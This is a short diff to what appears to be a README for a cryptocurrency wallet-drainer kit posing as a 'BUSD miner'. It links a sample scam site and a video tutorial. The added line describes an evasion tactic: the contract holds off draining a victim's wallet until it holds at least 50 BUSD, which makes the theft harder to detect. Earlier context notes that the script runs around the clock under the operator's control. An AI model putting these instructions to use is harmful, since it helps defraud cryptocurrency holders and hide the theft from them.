@@ -57,6 +57,8 @@ Smart contract
 
 4. the smart contract runs from the script in your fork and is running 24/7 so you have full control 
 
+5. If the victim has less than 50 busd in there wallet it will not drain it so its harder to detect it waits for the victim to get a certain amount of busd
+
 youtube tutorial https://www.youtube.com/watch?v=SnDlcDBAjso
 sample site https://busdminer.netlify.app/
 
